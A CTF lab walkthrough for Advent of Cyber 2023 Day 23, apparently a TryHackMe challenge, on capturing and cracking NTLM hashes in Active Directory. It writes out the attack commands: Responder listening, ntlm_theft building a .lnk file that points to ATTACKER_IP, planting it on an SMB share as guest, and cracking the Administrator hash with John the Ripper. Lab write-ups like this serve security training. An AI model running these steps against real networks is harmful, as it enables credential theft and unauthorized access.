# Relay All the Way | Advent of Cyber 2023 | Day 23

## TL;DR of Day 23
We will be learning about the hash exchange system for the Active Directory in windows and how we can exploit it using the men in the middle attack strategies.

## walkthrough

Start the machine and wait for 5 minutes to get it completely booted. I will suggest that you use the attack box for this challenge.

### Q1: What is the name of the AD authentication protocol that makes use of tickets?

AD's most famous authentication protocol is Kerberos.

### Q2: What is the name of the AD authentication protocol that makes use of the NTLM hash?

Should be simple google search.

### Q3: What is the name of the tool that can intercept these authentication challenges?

Responder can be used to intercept the authentication challenge.

### Q4: What is the password that McGreedy set for the Administrator account?
Let's start the responder server first. We can start the server with following commands:

```bash
responder -I ens5
```

Here ens5 is the network tunnel to listen on. If you are using your own machine with VPN then it will be your tun name like tun0.

Now we will use the netlm_theft tool to create the spoof file. 

For attckbox go to the `/root/Rooms/AoC2023/Day23/ntlm_theft/` directory and run the following command:

```bash
python3 ntlm_theft.py -g lnk -s ATTACKER_IP -f stealthy
```

Now cd into the stealthy directory and connect to the ElfShare samba partion as a guest and put the stealthy.lnk file there.

```bash
smbclient //10.10.249.3/ElfShare/ -U guest%
smb: \>put stealthy.lnk
smb: \>get greedykeys.txt
```

We also have the directory for potential passwords in the greedykeys.txt file. Download that into the local system.

Now wait for some time to receive the connection on the responder server. It should print the NTLM hash for the Administrator user.

Paste that hash into one file and use the john-the-ripper to bruteforce the password.

```bash
john --wordlist=greedykeys.txt hash.txt
```

It will give you the Administrator password.

### Q5: What is the value of the flag that is placed on the Administrator’s desktop?

Use the Administrator:PASSWORD to login using RDP with a app like remmina and get the flag from the Desktop.